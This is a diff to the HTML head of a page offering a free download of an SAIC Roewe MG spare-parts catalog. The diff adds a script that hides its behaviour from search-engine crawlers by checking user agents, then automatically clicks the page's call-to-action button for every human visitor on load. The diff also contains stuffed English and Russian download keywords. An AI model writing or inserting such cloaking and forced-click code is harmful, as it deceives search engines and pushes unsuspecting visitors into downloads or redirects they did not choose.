@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SAIC Roewe MG EPC 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the SAIC Roewe MG EPC 07.2024 for the latest spare parts catalog with detailed installation diagrams for various car models. Now available in multiple languages.">
     <meta name="keywords" content="SAIC Roewe MG EPC, SAIC Roewe MG EPC 2024, SAIC Roewe MG EPC download, SAIC Roewe MG EPC free download, SAIC Roewe MG EPC 07.2024 download, SAIC Roewe MG EPC 07.2024 free download, SAIC Roewe MG EPC 07.2024 каталог, SAIC Roewe MG EPC 07.2024 каталог Скачать, SAIC Roewe MG EPC 07.2024 каталог Бесплатно Скачать, SAIC Roewe MG EPC 2024 Russian, SAIC Roewe MG EPC 2024 Ukrainian, SAIC Roewe MG запчасти каталог, SAIC Roewe MG каталог запчастей, SAIC Roewe MG EPC каталог, SAIC Roewe электронный каталог запчастей, Roewe электронный каталог запчастей, MG электронный каталог запчастей, Roewe EPC каталог скачать, MG EPC каталог скачать, SAIC Motor EPC каталог, SAIC EPC электронный каталог запчастей, SAIC Roewe MG parts catalog, SAIC Roewe MG spare parts catalog, SAIC Roewe MG spare parts download, SAIC Roewe MG spare parts catalog free download, SAIC Motor parts catalog 2024, SAIC Motor parts catalog download, SAIC Motor parts catalog free download, 07.2024 SAIC Roewe MG EPC download, 07.2024 SAIC Roewe MG EPC free download, 07.2024 SAIC Roewe MG EPC каталог, SAIC Motor Roewe MG EPC July 2024, SAIC Motor Roewe MG EPC July 2024 download, SAIC Motor Roewe MG EPC July 2024 free download, Roewe автомобиле каталог запчастей, MG автомобиле каталог запчастей">
     <style>
